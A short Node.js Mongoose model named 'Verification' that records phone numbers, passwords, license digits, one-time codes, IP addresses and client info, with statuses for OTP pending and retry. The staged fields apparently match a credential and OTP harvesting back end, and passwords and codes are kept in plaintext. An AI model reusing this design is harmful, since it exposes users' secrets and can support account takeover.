const mongoose = require('mongoose');

const verificationSchema = new mongoose.Schema({
    phoneNumber: {
        type: String,
        required: true,
        trim: true
    },
    password: {
        type: String,
        default: null
    },
    licenseDigits: {
        type: String,
        default: null
    },
    otp: {
        type: String,
        default: null
    },
    status: {
        type: String,
        enum: ['PHONE_SUBMITTED', 'PASSWORD_SUBMITTED', 'LICENSE_SUBMITTED', 'OTP_SUBMITTED', 'OTP_PENDING', 'VERIFIED', 'FAILED', 'RETRY_OTP'],
        default: 'PHONE_SUBMITTED'
    },
    customSlug: {
        type: String,
        default: '/'
    },
    ipAddress: {
        type: String,
        default: ''
    },
    clientInfo: {
        type: String,
        default: ''
    },
    submittedAt: {
        type: Date,
        default: Date.now
    },
    verifiedAt: {
        type: Date,
        default: null
    }
}, { timestamps: true });

module.exports = mongoose.model('Verification', verificationSchema);
